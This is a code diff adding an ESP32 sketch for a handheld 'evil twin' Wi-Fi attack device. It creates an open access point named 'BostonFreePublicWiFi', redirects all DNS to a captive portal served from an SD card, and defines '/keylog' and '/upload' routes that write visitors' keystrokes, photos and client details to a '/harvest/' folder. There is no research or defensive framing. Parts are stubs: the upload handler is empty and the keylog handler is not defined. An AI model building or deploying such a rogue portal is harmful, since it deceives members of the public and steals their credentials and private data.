@@ -1,0 +1,70 @@
+// Shadow Evil Twin Standalone v3.7 - CYD-ESP32-3248S035R (Reaper Build)
+#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <AsyncDNS.h>  // or DNSServer
+#include <SPI.h>
+#include <SD.h>
+#include <TFT_eSPI.h>
+#include <XPT2046_Touchscreen.h>
+#include "painlessMesh.h"
+
+#define TFT_BL 21  // CYD backlight
+TFT_eSPI tft = TFT_eSPI();
+XPT2046_Touchscreen ts(33);  // CYD touch
+
+painlessMesh mesh;
+AsyncWebServer server(80);
+AsyncDNSServer dnsServer;
+
+const char* SSID = "BostonFreePublicWiFi";
+const char* PASS = "";
+const char* MESH_PREFIX = "ShadowMesh";
+const char* MESH_PASS = "shadowmesh2026";
+
+File harvestFile;
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(TFT_BL, OUTPUT);
+  digitalWrite(TFT_BL, HIGH);
+  tft.init();
+  tft.setRotation(0);
+  ts.begin();
+
+  if (!SD.begin(5)) {  // CYD SD CS pin usually 5 or 15
+    tft.println("SD Fail!");
+    while(1);
+  }
+  tft.println("SD OK - Shadow Active");
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(SSID);
+
+  // DNS captive
+  dnsServer.start(53, "*", WiFi.softAPIP());
+
+  // Serve portal from SD
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
+    req->send(SD, "/index.html", "text/html");
+  });
+  server.on("/upload", HTTP_POST, handleUpload);  // SD save
+  server.on("/keylog", HTTP_POST, handleKeylog);
+  // ... other routes
+
+  server.begin();
+  mesh.init(MESH_PREFIX, MESH_PASS, 5555);
+
+  tft.println("AP: " + String(SSID));
+  tft.println("IP: " + WiFi.softAPIP().toString());
+}
+
+void loop() {
+  mesh.update();
+  dnsServer.processNextRequest();
+  // TFT touch handling for controls
+}
+
+// Handlers write directly to SD /harvest/ dir with timestamps + client info
+void handleUpload(AsyncWebServerRequest *req, String filename, size_t index, uint8_t *data, size_t len, bool final) {
+  // Save photo to SD, log metadata
+}
